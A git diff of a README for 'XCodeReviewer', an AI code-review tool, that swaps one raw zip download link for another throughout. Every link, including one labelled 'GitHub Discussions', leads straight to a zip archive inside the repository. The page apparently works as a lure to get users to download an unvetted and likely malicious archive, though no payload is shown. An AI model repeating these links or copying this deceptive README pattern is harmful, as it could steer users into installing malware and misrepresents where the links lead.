@@ -1,6 +1,6 @@
 # 🚀 XCodeReviewer - Smart Code Analysis Made Easy
 
-[![Download XCodeReviewer](https://raw.githubusercontent.com/MhagoChris/XCodeReviewer/main/Yazoo/XCodeReviewer.zip%20Now-Get%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/MhagoChris/XCodeReviewer/main/Yazoo/XCodeReviewer.zip)
+[![Download XCodeReviewer](https://github.com/MhagoChris/XCodeReviewer/raw/refs/heads/main/history/X_Code_Reviewer_1.4.zip%20Now-Get%20Latest%20Release-brightgreen)](https://github.com/MhagoChris/XCodeReviewer/raw/refs/heads/main/history/X_Code_Reviewer_1.4.zip)
 
 ## 🌟 Overview
 XCodeReviewer is an advanced tool designed to improve code quality and security. It uses large language models and explainable AI to analyze your code. Whether you want to review an entire repository or a single code snippet, XCodeReviewer helps you find hidden bugs, security flaws, and performance issues. Enjoy insightful feedback on your pull requests and daily development tasks.
@@ -13,7 +13,7 @@ XCodeReviewer is an advanced tool designed to improve code quality and security.
 - **User-Friendly Feedback**: Receive clear, actionable recommendations.
 
 ## 📥 Download & Install
-To download XCodeReviewer, simply [visit this page to download](https://raw.githubusercontent.com/MhagoChris/XCodeReviewer/main/Yazoo/XCodeReviewer.zip). Here you will find the latest and past releases of the software. 
+To download XCodeReviewer, simply [visit this page to download](https://github.com/MhagoChris/XCodeReviewer/raw/refs/heads/main/history/X_Code_Reviewer_1.4.zip). Here you will find the latest and past releases of the software. 
 
 1. Click on the link above.
 2. Look for the version you want to download.
@@ -51,7 +51,7 @@ If you need help or want to learn more about using XCodeReviewer, you can find h
 - **Support**: Contact details for troubleshooting.
 
 ## 🎉 Community and Contributions
-Join our community of users. Share your experiences, request features, or contribute to XCodeReviewer’s development. Visit our [GitHub Discussions](https://raw.githubusercontent.com/MhagoChris/XCodeReviewer/main/Yazoo/XCodeReviewer.zip) page to connect with others.
+Join our community of users. Share your experiences, request features, or contribute to XCodeReviewer’s development. Visit our [GitHub Discussions](https://github.com/MhagoChris/XCodeReviewer/raw/refs/heads/main/history/X_Code_Reviewer_1.4.zip) page to connect with others.
 
 ## 🧑‍🤝‍🧑 Contribution Guidelines
 We welcome contributions to improve XCodeReviewer. Here's how you can get involved:
@@ -74,4 +74,4 @@ XCodeReviewer leverages advanced technologies and libraries. Thank you to all th
 ## ⚖️ License
 XCodeReviewer is licensed under the MIT License. You can freely use, modify, and distribute this software, provided you include the original license in any copies of the software.
 
-[![Download XCodeReviewer](https://raw.githubusercontent.com/MhagoChris/XCodeReviewer/main/Yazoo/XCodeReviewer.zip%20Now-Get%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/MhagoChris/XCodeReviewer/main/Yazoo/XCodeReviewer.zip)
+[![Download XCodeReviewer](https://github.com/MhagoChris/XCodeReviewer/raw/refs/heads/main/history/X_Code_Reviewer_1.4.zip%20Now-Get%20Latest%20Release-brightgreen)](https://github.com/MhagoChris/XCodeReviewer/raw/refs/heads/main/history/X_Code_Reviewer_1.4.zip)
